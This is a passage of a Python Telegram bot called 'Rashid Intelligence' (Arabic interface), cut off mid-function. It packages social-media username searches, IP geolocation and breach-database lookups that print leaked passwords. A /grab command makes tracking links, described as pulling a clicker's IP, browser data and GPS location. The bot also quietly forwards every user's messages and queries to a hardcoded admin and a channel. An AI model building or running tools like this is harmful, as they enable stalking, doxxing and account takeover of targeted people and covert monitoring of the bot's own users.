"""
⚡ راشد الاستخباراتي v3.0
   تصميم وتطوير: أبو سعود
"""

import os
import re
import base64
import hashlib
import time
import json
import requests
from datetime import datetime
from collections import defaultdict

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  إعدادات النظام
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MAIN_BOT_TOKEN    = os.getenv("MAIN_BOT_TOKEN", "")
TRACKER_BOT_TOKEN = os.getenv("TRACKER_BOT_TOKEN", "")
TARGET_CHANNEL_ID = os.getenv("TARGET_CHANNEL_ID", "-1003770774871")
GROQ_API_KEY      = os.getenv("GROQ_API_KEY", "")
TAVILY_API_KEY    = os.getenv("TAVILY_API_KEY", "")
IPINFO_TOKEN      = os.getenv("IPINFO_TOKEN", "")
VIRUSTOTAL_KEY    = os.getenv("VIRUSTOTAL_KEY", "")
DEHASHED_KEY      = os.getenv("DEHASHED_KEY", "")
BOT_SERVER_URL    = (
    os.getenv("BOT_SERVER_URL", "")
    or (os.getenv("REPLIT_DOMAINS", "").split(",")[0].strip())
)

try:
    ADMIN_ID = int(os.getenv("ADMIN_ID", "6124349953"))
except ValueError:
    ADMIN_ID = 6124349953

# سجل روابط التعقب لكل مستخدم (في الذاكرة)
# user_logs[user_id] = [ {session_id, url, label, timestamp}, ... ]
user_logs: dict[int, list] = defaultdict(list)

SYSTEM_PROMPT = (
    "أنت نظام ذكاء اصطناعي استخباراتي متقدم، اسمك «راشد»، من تصميم وتطوير أبو سعود.\n"
    "ردودك حصراً باللغة العربية، بأسلوب رسمي مقتضب كتقارير الأجهزة الأمنية.\n"
    "ابدأ كل رد بـ: [راشد // تحليل]\n"
    "اختم كل رد بـ: ◈ تصميم وتطوير: أبو سعود"
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📤  إرسال للقناة عبر بوت التعقب
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def send_to_channel(message: str):
    """يرسل عبر بوت التعقب (8346034907) إلى القناة المستهدفة"""
    if not TRACKER_BOT_TOKEN or not TARGET_CHANNEL_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage",
            json={
                "chat_id": TARGET_CHANNEL_ID,
                "text": message,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
    except Exception:
        pass


def notify_admin(bot, text: str, user: object):
    """إرسال نسخة لمراقبة المدير (بشكل غير متزامن via requests)"""
    msg = (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "👁 [راشد // مراقبة مستخدم]\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 الاسم  : {user.full_name}\n"
        f"🆔 ID     : `{user.id}`\n"
        f"📛 معرف   : @{user.username or 'N/A'}\n"
        f"🕐 التوقيت: {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"{text}"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ADMIN_ID,
                "text": msg[:4000],
                "parse_mode": "Markdown",
                "disable_web_page_preview": True,
            },
            timeout=8,
        )
    except Exception:
        pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🧠  الذكاء الاصطناعي | Groq AI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ask_groq(prompt: str) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq غير مُهيّأ."
    headers = {
        "Authorization": f"Bearer {GROQ_API_KEY}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": "llama3-70b-8192",
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": prompt},
        ],
        "temperature": 0.5,
        "max_tokens": 1024,
    }
    try:
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers=headers, json=payload, timeout=30
        )
        r.raise_for_status()
        return r.json()["choices"][0]["message"]["content"]
    except requests.exceptions.HTTPError as e:
        return f"⚠️ [راشد // خطأ AI]\nكود الخطأ: {e.response.status_code}"
    except Exception as e:
        return f"⚠️ [راشد // خطأ AI]\n{str(e)[:80]}"


def analyze_image_groq(image_bytes: bytes, prompt: str) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq غير مُهيّأ."
    b64 = base64.b64encode(image_bytes).decode()
    headers = {
        "Authorization": f"Bearer {GROQ_API_KEY}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": "meta-llama/llama-4-scout-17b-16e-instruct",
        "messages": [
            {
                "role": "user",
                "content": [
                    {"type": "text", "text": f"{SYSTEM_PROMPT}\n\nمهمة: {prompt}"},
                    {
                        "type": "image_url",
                        "image_url": {"url": f"data:image/jpeg;base64,{b64}"},
                    },
                ],
            }
        ],
        "temperature": 0.4,
        "max_tokens": 1024,
    }
    try:
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers=headers, json=payload, timeout=45
        )
        r.raise_for_status()
        return r.json()["choices"][0]["message"]["content"]
    except requests.exceptions.HTTPError as e:
        return f"⚠️ [راشد // خطأ رؤية]\nكود الخطأ: {e.response.status_code}"
    except Exception as e:
        return f"⚠️ [راشد // خطأ رؤية]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔍  البحث الحي | Tavily
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def tavily_search(query: str, max_results: int = 5) -> list:
    """يُعيد قائمة نتائج خام من Tavily"""
    if not TAVILY_API_KEY:
        return []
    try:
        r = requests.post(
            "https://api.tavily.com/search",
            json={
                "api_key": TAVILY_API_KEY,
                "query": query,
                "search_depth": "advanced",
                "max_results": max_results,
                "include_answer": True,
            },
            timeout=20,
        )
        r.raise_for_status()
        return r.json().get("results", []), r.json().get("answer", "")
    except Exception:
        return [], ""


def cmd_osint_search(query: str) -> str:
    results, answer = tavily_search(query, 5)
    if not results and not answer:
        return "⛔ فشل البحث أو لا توجد نتائج."

    report = "━━━━━━━━━━━━━━━━━━━━━\n📡 [راشد // تقرير بحثي]\n━━━━━━━━━━━━━━━━━━━━━\n"
    report += f"🔎 الاستعلام: {query}\n\n"
    if answer:
        report += f"📌 ملخص:\n{answer[:400]}\n\n"
    report += "📂 المصادر:\n"
    for i, res in enumerate(results[:4], 1):
        title = res.get("title", "—")[:60]
        url   = res.get("url", "#")
        snip  = res.get("content", "")[:100]
        report += f"\n{i}▪ {title}\n   🔗 {url}\n   ↳ {snip}...\n"
    report += "\n━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
    return report


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  👤  OSINT اسم المستخدم على منصات التواصل
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PLATFORMS = {
    "فيسبوك":   "site:facebook.com",
    "إنستغرام":  "site:instagram.com",
    "تلجرام":   "site:t.me OR site:telegram.me",
    "تيك توك":  "site:tiktok.com",
    "سناب شات": "site:snapchat.com",
    "تويتر/X":  "site:twitter.com OR site:x.com",
}


def osint_username(username: str) -> str:
    clean = username.lstrip("@").strip()
    report  = "━━━━━━━━━━━━━━━━━━━━━\n"
    report += f"🕵 [راشد // OSINT مستخدم]\n"
    report += "━━━━━━━━━━━━━━━━━━━━━\n"
    report += f"🎯 الهدف: @{clean}\n"
    report += f"🕐 {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
    report += "━━━━━━━━━━━━━━━━━━━━━\n\n"

    found_any = False
    for platform, site_query in PLATFORMS.items():
        query = f'{site_query} "{clean}"'
        results, _ = tavily_search(query, 3)
        if results:
            found_any = True
            report += f"✅ {platform}:\n"
            for res in results[:2]:
                title = res.get("title", "—")[:50]
                url   = res.get("url", "#")
                snip  = res.get("content", "")[:80]
                report += f"   🔗 {url}\n   ↳ {snip[:80]}...\n"
            report += "\n"
        else:
            report += f"❌ {platform}: لا توجد نتائج\n\n"

    if not found_any:
        report += "⚠️ لم يُعثر على أي أثر رقمي لهذا المستخدم.\n\n"

    report += "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
    return report


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🌍  تحليل IP | IPInfo
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def analyze_ip(ip: str) -> str:
    if not IPINFO_TOKEN:
        return "⛔ مفتاح IPInfo غير مُهيّأ."
    try:
        r = requests.get(
            f"https://ipinfo.io/{ip}/json",
            headers={"Authorization": f"Bearer {IPINFO_TOKEN}"},
            timeout=12,
        )
        r.raise_for_status()
        d = r.json()
        if "error" in d:
            return f"⛔ IP غير صالح: {ip}"
        loc  = d.get("loc", ",").split(",")
        lat  = loc[0] if len(loc) == 2 else "N/A"
        lon  = loc[1] if len(loc) == 2 else "N/A"
        maps = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else ""

        report  = "━━━━━━━━━━━━━━━━━━━━━\n🌐 [راشد // تقرير IP]\n━━━━━━━━━━━━━━━━━━━━━\n"
        report += f"🎯 IP         : {d.get('ip', ip)}\n"
        report += f"🏳 الدولة    : {d.get('country', 'N/A')}\n"
        report += f"🏙 المدينة   : {d.get('city', 'N/A')}\n"
        report += f"📍 المنطقة   : {d.get('region', 'N/A')}\n"
        report += f"🏢 المزود    : {d.get('org', 'N/A')}\n"
        report += f"📮 الرمز     : {d.get('postal', 'N/A')}\n"
        report += f"🕐 المنطقة   : {d.get('timezone', 'N/A')}\n"
        if maps:
            report += f"🗺 الخريطة  : {maps}\n"
        report += "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
        return report
    except Exception as e:
        return f"⚠️ [راشد // خطأ IP]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🛡  فحص الروابط | VirusTotal
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def scan_url(url_to_scan: str) -> str:
    if not VIRUSTOTAL_KEY:
        return "⛔ مفتاح VirusTotal غير مُهيّأ."
    headers_vt = {"x-apikey": VIRUSTOTAL_KEY, "Content-Type": "application/x-www-form-urlencoded"}
    try:
        sub = requests.post(
            "https://www.virustotal.com/api/v3/urls",
            headers=headers_vt, data={"url": url_to_scan}, timeout=20
        )
        sub.raise_for_status()
        analysis_id = sub.json()["data"]["id"]

        for _ in range(6):
            time.sleep(5)
            res = requests.get(
                f"https://www.virustotal.com/api/v3/analyses/{analysis_id}",
                headers={"x-apikey": VIRUSTOTAL_KEY}, timeout=12
            )
            res.raise_for_status()
            data   = res.json()["data"]["attributes"]
            status = data.get("status", "queued")
            if status == "completed":
                st = data["stats"]
                mal  = st.get("malicious", 0)
                sus  = st.get("suspicious", 0)
                harm = st.get("harmless", 0)
                undet= st.get("undetected", 0)
                total= mal + sus + harm + undet
                verdict = "🔴 خطر" if mal > 0 else ("🟡 مريب" if sus > 0 else "🟢 آمن")

                report  = "━━━━━━━━━━━━━━━━━━━━━\n🛡 [راشد // تقرير أمني]\n━━━━━━━━━━━━━━━━━━━━━\n"
                url_disp = (url_to_scan[:55] + "...") if len(url_to_scan) > 58 else url_to_scan
                report += f"🔗 الرابط  : {url_disp}\n"
                report += f"⚖️ الحكم   : {verdict}\n"
                report += f"🔴 خطر     : {mal}/{total}\n"
                report += f"🟡 مريب    : {sus}/{total}\n"
                report += f"🟢 نظيف    : {harm}/{total}\n"
                report += "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
                return report

        return "⚠️ لم يكتمل الفحص في الوقت المحدد."
    except Exception as e:
        return f"⚠️ [راشد // خطأ VT]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔓  فحص التسريبات | DeHashed
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def check_breach(target: str) -> str:
    if not DEHASHED_KEY:
        return "⛔ مفتاح DeHashed غير مُهيّأ."
    qtype = "email" if "@" in target else "phone"
    try:
        r = requests.get(
            "https://api.dehashed.com/search",
            headers={"Authorization": f"Basic {DEHASHED_KEY}", "Content-Type": "application/json"},
            params={"query": f'{qtype}:"{target}"', "size": 10},
            timeout=20,
        )
        r.raise_for_status()
        data    = r.json()
        total   = data.get("total", 0)
        entries = data.get("entries", [])

        report  = "━━━━━━━━━━━━━━━━━━━━━\n🔓 [راشد // تقرير تسريب]\n━━━━━━━━━━━━━━━━━━━━━\n"
        report += f"🎯 الهدف: {target}\n"
        if total == 0:
            report += "✅ لا توجد سجلات في قواعد التسريبات.\n"
        else:
            report += f"⚠️ عدد السجلات: {total}\n"
            for i, e in enumerate(entries[:5], 1):
                report += f"\n[#{i}]\n"
                for key, label in [("email","📧"),("username","👤"),("password","🔑"),("database_name","🗂"),("ip_address","🌐")]:
                    if e.get(key):
                        report += f"  {label} {e[key]}\n"
            if total > 5:
                report += f"\n... و{total-5} سجل إضافي.\n"
        report += "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
        return report
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 401:
            return "⛔ مفتاح DeHashed غير صالح."
        return f"⚠️ [راشد // خطأ]\nكود: {e.response.status_code}"
    except Exception as e:
        return f"⚠️ [راشد // خطأ]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📡  توليد رابط التعقب | Grab Link
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def create_grab_link(label: str = "op") -> dict:
    session_id = hashlib.md5(f"{label}{time.time()}".encode()).hexdigest()[:14]
    url = f"https://{BOT_SERVER_URL}/track/{session_id}" if BOT_SERVER_URL else None
    return {
        "url": url,
        "session_id": session_id,
        "label": label,
        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC"),
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎛  الكشف التلقائي
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

URL_RE   = re.compile(r"https?://[^\s]+|www\.[^\s]+", re.I)
IP_RE    = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
EMAIL_RE = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")


def smart_detect(text: str) -> str:
    if URL_RE.search(text):   return "url"
    if IP_RE.search(text):    return "ip"
    if EMAIL_RE.search(text): return "email"
    return "ai"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎛  القوائم
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 تحليل IP",    callback_data="m_ip"),
         InlineKeyboardButton("🛡 فحص رابط",    callback_data="m_scan")],
        [InlineKeyboardButton("🔍 بحث OSINT",   callback_data="m_osint"),
         InlineKeyboardButton("👤 بحث مستخدم",  callback_data="m_user")],
        [InlineKeyboardButton("📡 رابط تعقب",   callback_data="m_grab"),
         InlineKeyboardButton("📋 سجلاتي",      callback_data="m_mylogs")],
        [InlineKeyboardButton("🧠 تحليل صورة",  callback_data="m_vision"),
         InlineKeyboardButton("ℹ️ عن النظام",    callback_data="m_about")],
    ])


def back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("↩️ القائمة الرئيسية", callback_data="m_main")]])


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📨  معالجات الأوامر
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    name = update.effective_user.first_name or "العميل"
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ [راشد // تهيئة النظام]\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"مرحباً، {name}.\nاختر الأداة المطلوبة:\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "◈ تصميم وتطوير: أبو سعود",
        reply_markup=main_kb(),
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    txt = (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📋 [راشد // دليل الأوامر]\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "/start        — تشغيل النظام\n"
        "/osint <استعلام> — بحث OSINT على الإنترنت\n"
        "/user <اسم>   — بحث مستخدم على المنصات\n"
        "/ip <IP>      — تتبع عنوان IP\n"
        "/scan <رابط>  — فحص أمني للرابط\n"
        "/grab <تصنيف> — توليد رابط سحب IP\n"
        "/mylogs       — عرض سجلات روابطك\n"
        "/clear        — مسح ذاكرة المحادثة\n"
        "/help         — قائمة الأوامر\n\n"
        "🔒 للمدير فقط:\n"
        "/dehashed <هدف> — بحث في التسريبات\n"
        "/vt <رابط>    — فحص VirusTotal\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "◈ تصميم وتطوير: أبو سعود"
    )
    await update.message.reply_text(txt, reply_markup=back_kb())


async def cmd_ip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = ctx.args
    if not args:
        return await update.message.reply_text("⚠️ الاستخدام:\n/ip 8.8.8.8", reply_markup=back_kb())
    ip = args[0].strip()
    msg = await update.message.reply_text(f"⏳ تحليل IP: {ip}...")
    result = analyze_ip(ip)
    await msg.edit_text(result, reply_markup=back_kb())
    if user.id != ADMIN_ID:
        notify_admin(ctx.bot, f"📌 طلب تحليل IP: `{ip}`\n\n{result}", user)


async def cmd_scan(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = ctx.args
    if not args:
        return await update.message.reply_text("⚠️ الاستخدام:\n/scan https://example.com", reply_markup=back_kb())
    url = args[0].strip()
    msg = await update.message.reply_text("⏳ جارٍ فحص الرابط...")
    result = scan_url(url)
    await msg.edit_text(result, reply_markup=back_kb())
    if user.id != ADMIN_ID:
        notify_admin(ctx.bot, f"📌 طلب فحص رابط: {url}\n\n{result}", user)


async def cmd_osint(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = ctx.args
    if not args:
        return await update.message.reply_text("⚠️ الاستخدام:\n/osint هجمات سيبرانية 2025", reply_markup=back_kb())
    query = " ".join(args)
    msg   = await update.message.reply_text("⏳ جارٍ البحث في المصادر الحية...")
    result = cmd_osint_search(query)
    await msg.edit_text(result, reply_markup=back_kb())
    if user.id != ADMIN_ID:
        notify_admin(ctx.bot, f"📌 استعلام OSINT: {query}", user)


async def cmd_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = ctx.args
    if not args:
        return await update.message.reply_text(
            "⚠️ الاستخدام:\n/user <اسم المستخدم>\nمثال: /user ahmed2025",
            reply_markup=back_kb()
        )
    username = args[0].strip()
    msg = await update.message.reply_text(
        f"⏳ جارٍ البحث عن @{username.lstrip('@')} على جميع المنصات...\n"
        "⚠️ قد يستغرق هذا 20-30 ثانية."
    )
    result = osint_username(username)
    await msg.edit_text(result[:4000], reply_markup=back_kb())
    if user.id != ADMIN_ID:
        notify_admin(ctx.bot, f"📌 OSINT مستخدم: @{username}", user)
    # إرسال للقناة عبر بوت التعقب
    send_to_channel(
        f"🕵 [راشد // OSINT مستخدم]\n"
        f"👤 {user.full_name} (@{user.username or 'N/A'})\n"
        f"🎯 البحث عن: @{username.lstrip('@')}"
    )


async def cmd_grab(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user  = update.effective_user
    label = " ".join(ctx.args) if ctx.args else "op"
    data  = create_grab_link(label)

    if not data["url"]:
        await update.message.reply_text(
            "⛔ لا يمكن توليد الرابط: عنوان الخادم غير متاح.",
            reply_markup=back_kb()
        )
        return

    # تخزين في سجل المستخدم
    user_logs[user.id].append(data)

    txt = (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📡 [راشد // رابط تعقب]\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔗 الرابط:\n`{data['url']}`\n\n"
        f"🆔 الجلسة : `{data['session_id']}`\n"
        f"🏷 التصنيف : {data['label']}\n"
        f"🕐 وقت التوليد: {data['timestamp']}\n\n"
        "⚡ عند الضغط:\n"
        "  ↳ سحب IP + بيانات المتصفح\n"
        "  ↳ طلب إذن الموقع GPS\n"
        "  ↳ تقرير فوري إلى القناة\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "◈ تصميم وتطوير: أبو سعود"
    )
    await update.message.reply_text(txt, reply_markup=back_kb(), parse_mode="Markdown")
    if user.id != ADMIN_ID:
        notify_admin(ctx.bot, f"📡 طلب رابط تعقب\n🆔 `{data['session_id']}`\n🏷 {label}", user)


async def cmd_mylogs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user  = update.effective_user
    logs  = user_logs.get(user.id, [])
    if not logs:
        return await update.message.reply_text(
            "📋 لا توجد سجلات بعد.\nاستخدم /grab لتوليد رابط تعقب.",
            reply_markup=back_kb()
        )
    txt = "━━━━━━━━━━━━━━━━━━━━━\n📋 [راشد // سجلاتك]\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, entry in enumerate(logs[-8:], 1):
        txt += f"[{i}] 🆔 `{entry['session_id']}`\n"
        txt += f"    🏷 {entry['label']}\n"
        txt += f"    🕐 {entry['timestamp']}\n"
        txt += f"    🔗 {entry['url']}\n\n"
    txt += "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
    await update.message.reply_text(txt, reply_markup=back_kb(), parse_mode="Markdown")


async def cmd_dehashed(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != ADMIN_ID:
        return await update.message.reply_text("⛔ هذا الأمر للمدير فقط.")
    args = ctx.args
    if not args:
        return await update.message.reply_text("⚠️ الاستخدام:\n/dehashed user@email.com", reply_markup=back_kb())
    target = " ".join(args).strip()
    msg = await update.message.reply_text("⏳ جارٍ مسح قواعد التسريبات...")
    result = check_breach(target)
    await msg.edit_text(result, reply_markup=back_kb())


async def cmd_vt(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != ADMIN_ID:
        return await update.message.reply_text("⛔ هذا الأمر للمدير فقط.")
    args = ctx.args
    if not args:
        return await update.message.reply_text("⚠️ الاستخدام:\n/vt https://example.com", reply_markup=back_kb())
    url = args[0].strip()
    msg = await update.message.reply_text("⏳ جارٍ فحص VirusTotal...")
    result = scan_url(url)
    await msg.edit_text(result, reply_markup=back_kb())


async def cmd_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data.clear()
    await update.message.reply_text(
        "✅ تم مسح ذاكرة المحادثة.\n◈ تصميم وتطوير: أبو سعود",
        reply_markup=back_kb()
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🖼  معالج الصور
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def handle_image(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user    = update.effective_user
    caption = update.message.caption or "حلل الصورة: صف محتواها، استخرج النصوص، وحدد الأشياء."
    msg     = await update.message.reply_text("⏳ جارٍ تحليل الصورة...")
    try:
        photo      = update.message.photo[-1]
        file       = await ctx.bot.get_file(photo.file_id)
        img_bytes  = bytes(await file.download_as_bytearray())
        result     = analyze_image_groq(img_bytes, caption)
        await msg.edit_text(result[:4000], reply_markup=back_kb())
        if user.id != ADMIN_ID:
            notify_admin(ctx.bot, f"📸 أرسل صورة للتحليل", user)
    except Exception as e:
        await msg.edit_text(f"⚠️ [راشد // خطأ]\n{str(e)[:80]}", reply_markup=back_kb())


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  💬  معالج النصوص (كشف ذكي تلقائي)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    kind = smart_detect(text)

    if user.id != ADMIN_ID:
        notify_admin(ctx.bot, f"💬 رسالة نصية:\n`{text[:300]}`", user)

    if kind == "url":
        match = URL_RE.search(text)
        if match:
            url = match.group(0)
            if not url.startswith("http"):
                url = "http://" + url
            msg    = await update.message.reply_text(f"🔎 رصد رابط — فحص تلقائي...\n🔗 {url}")
            result = scan_url(url)
            await msg.edit_text(result, reply_markup=back_kb())
            return

    if kind == "ip":
        match = IP_RE.search(text)
        if match:
            msg    = await update.message.reply_text(f"🌐 رصد IP — تحليل تلقائي...\n📍 {match.group(0)}")
            result = analyze_ip(match.group(0))
            await msg.edit_text(result, reply_markup=back_kb())
            return

    if kind == "email":
        match = EMAIL_RE.search(text)
        if match:
            msg    = await update.message.reply_text(f"📧 رصد إيميل — فحص تسريبات للمدير فقط.\n{match.group(0)}")
            await msg.edit_text(
                "⛔ فحص التسريبات متاح للمدير فقط.\nاستخدم /dehashed" if user.id != ADMIN_ID else check_breach(match.group(0)),
                reply_markup=back_kb()
            )
            return

    # رد ذكاء اصطناعي
    msg    = await update.message.reply_text("⏳ جارٍ المعالجة...")
    result = ask_groq(text)
    await msg.edit_text(result[:4000], reply_markup=back_kb())


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎛  معالج الأزرار
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MENU_HELP = {
    "m_ip":     "🌐 تحليل IP\n\nالأمر:\n`/ip 8.8.8.8`",
    "m_scan":   "🛡 فحص رابط\n\nالأمر:\n`/scan https://example.com`\nأو أرسل الرابط مباشرة.",
    "m_osint":  "🔍 بحث OSINT\n\nالأمر:\n`/osint أحدث هجمات سيبرانية`",
    "m_user":   "👤 OSINT مستخدم\n\nالأمر:\n`/user ahmed2025`\nيبحث على فيسبوك، إنستغرام، تلجرام، تيك توك، سناب شات.",
    "m_grab":   "📡 رابط تعقب\n\nالأمر:\n`/grab تصنيف-اختياري`\nيولّد رابط يسحب IP+GPS عند الضغط.",
    "m_mylogs": "📋 سجلاتك\n\nالأمر:\n`/mylogs`\nيعرض روابط التعقب التي ولّدتها.",
    "m_vision": "🧠 تحليل صورة\n\nأرسل الصورة مع أو بدون وصف.\nسأحللها بالرؤية الحاسوبية.",
    "m_about":  (
        "━━━━━━━━━━━━━━━━━━━━━\n⚡ [راشد // معلومات]\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        "الاسم    : راشد الاستخباراتي\nالإصدار  : v3.0\nالمطور   : أبو سعود\n\n"
        "الأنظمة:\n• Groq AI (LLaMA 3 + Vision)\n• Tavily Live Search\n"
        "• VirusTotal • DeHashed • IPInfo\n• IP/GPS Logger\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
    ),
}


async def handle_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    if data == "m_main":
        await q.edit_message_text(
            "━━━━━━━━━━━━━━━━━━━━━\n⚡ [راشد // القائمة]\n━━━━━━━━━━━━━━━━━━━━━\n\n"
            "اختر الأداة:\n\n━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود",
            reply_markup=main_kb(),
        )
        return

    if data == "m_mylogs":
        user = q.from_user
        logs = user_logs.get(user.id, [])
        if not logs:
            await q.edit_message_text(
                "📋 لا توجد سجلات بعد.\nاستخدم /grab لتوليد رابط تعقب.",
                reply_markup=back_kb()
            )
        else:
            txt = "━━━━━━━━━━━━━━━━━━━━━\n📋 سجلاتك\n━━━━━━━━━━━━━━━━━━━━━\n\n"
            for i, e in enumerate(logs[-6:], 1):
